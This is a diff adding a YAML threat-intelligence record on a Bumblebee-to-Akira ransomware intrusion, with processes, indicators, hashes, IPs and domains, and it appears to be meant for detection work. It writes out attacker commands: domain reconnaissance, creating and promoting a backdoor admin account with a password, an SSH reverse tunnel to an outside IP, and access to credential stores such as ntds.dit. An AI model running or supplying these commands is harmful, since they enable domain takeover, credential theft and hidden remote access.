@@ -1,0 +1,70 @@
+description: Bumblebee malware delivered through SEO poisoning, leading to ransomware
+  deployment.
+malware_families:
+- Bumblebee
+- Akira
+TTPs:
+  processes:
+  - cmd.exe
+  - powershell.exe
+  - consent.exe
+  - wbadmin.exe
+  - ssh
+  - psql.exe
+  - rundll32.exe
+  - net.exe
+  - FileZilla_*_setup.exe
+  commandline:
+  - 'systeminfo.exe nltest.exe /dclist:'
+  - nltest.exe /domain_trusts
+  - whoami.exe /groups
+  - net group "domain admins" /dom
+  - net user backup_EA P@ssw0rd1234 /add /dom
+  - net group "enterprise admins" backup_EA /add /dom
+  - ssh root@<external_ip> -R *:10400 -p22
+  powershell: []
+  scripting_engine: []
+  registry_keys: []
+  image_load:
+  - msimg32.dll
+  network_connections:
+  - consent.exe, 109.205.195.211:443
+  - consent.exe, 188.40.187.145:443
+  - AdgNsy.exe, 172.96.137.160:443
+  - ssh root@193.242.184.150 -R *:10400 -p22
+  file_activity:
+  - ManageEngine-OpManager.msi
+  - msimg32.dll
+  - C:\\ProgramData\\shares.txt
+  - C:\\windows\\NTDS\\ntds.dit
+  - C:\\windows\\system32\\config\\SYSTEM
+  - C:\\windows\\system32\\config\\SECURITY
+  persistence:
+  - RustDesk remote access tool installation
+  - SSH reverse tunneling to external IPs
+  process_relations:
+  - consent.exe -> msimg32.dll
+  - AdgNsy.exe -> C2 channel
+IOCs:
+  hashes:
+  - 186b26df63df3b7334043b47659cba4185c948629d857d47452cc1936f0aa5da
+  - a14506c6fb92a5af88a6a44d273edafe10d69ee3d85c8b2a7ac458a22edf68d2
+  - a6df0b49a5ef9ffd6513bfe061fb60f6d2941a440038e2de8a7aeb1914945331
+  - de730d969854c3697fd0e0803826b4222f3a14efe47e4c60ed749fff6edce19d
+  ip_addresses:
+  - 109.205.195.211
+  - 188.40.187.145
+  - 172.96.137.160
+  - 193.242.184.150
+  - 185.174.100.203
+  domains:
+  - ev2sirbd269o5j.org
+  - 2rxyt9urhq0bgj.org
+  - opmanager.pro
+  - angryipscanner.org
+  - axiscamerastation.org
+  - ip-scanner.org
+  urls: []
+reference: https://thedfirreport.com/2025/11/04/from-bing-search-to-ransomware-bumblebee-and-adaptixc2-deliver-akira-2
+date_of_publication: November 04, 2025
+file_creation_date: February 21, 2026
